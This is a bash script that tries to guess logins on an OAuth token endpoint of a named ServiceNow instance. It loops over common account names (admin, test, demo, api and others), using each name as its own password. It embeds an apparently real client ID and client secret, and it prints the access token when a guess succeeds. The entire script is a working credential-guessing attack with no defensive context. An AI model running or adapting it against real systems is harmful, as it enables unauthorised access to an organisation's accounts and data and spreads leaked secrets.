#!/bin/bash
for user in admin test demo oauth api integration; do
  echo "Testing user: $user"
  response=$(curl -s -X POST https://devskandia.service-now.com/oauth_token.do \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Accept: application/json" \
    -d "grant_type=password&client_id=5051cfd32fb664108e8a54c006a49865&client_secret=fdbef6df1bfa6490c7b90c25464bcbad&username=$user&password=$user&scope=useraccount" \
    -w "\nHTTP_CODE:%{http_code}" 2>/dev/null)

  if echo "$response" | grep -q "access_token"; then
    echo "✅ SUCCESS with user: $user"
    echo "$response" | head -1
    break
  else
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
    echo "  Status: $http_code"
  fi
done